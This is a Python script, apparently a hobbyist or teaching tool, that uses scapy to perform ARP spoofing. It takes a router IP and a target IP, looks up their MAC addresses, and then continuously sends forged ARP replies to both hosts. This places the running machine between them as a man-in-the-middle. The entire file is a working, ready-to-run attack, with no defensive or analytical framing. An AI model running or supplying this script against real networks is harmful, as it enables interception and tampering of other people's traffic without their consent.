import scapy.all as scapy
import sys
import time

# Function to get the MAC address corresponding to an IP address
def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')  # Ethernet broadcast address
    arp_layer = scapy.ARP(pdst=ip_address)  # ARP request for the target IP
    get_mac_packet = broadcast_layer/arp_layer  # Combine Ethernet and ARP layers
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]  # Send packet and receive response
    return answer[0][1].hwsrc  # Return the MAC address from the response

# Function to perform ARP spoofing
def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)  # Create ARP packet for router
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)  # Create ARP packet for target
    scapy.send(packet1)  # Send ARP packet to router
    scapy.send(packet2)  # Send ARP packet to target

# Read target IP and router IP from command line arguments
target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])

# Get MAC addresses for target and router
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
    while True:  # Continuously perform ARP spoofing
        spoof(router_ip, target_ip, router_mac, target_mac)  # Perform ARP spoofing for target and router
        time.sleep(2)  # Pause for 2 seconds before sending the next ARP packets
except KeyboardInterrupt:
    print('Closing ARP Spoofer.')
    exit(0)  # Exit the script gracefully if Ctrl+C is pressed
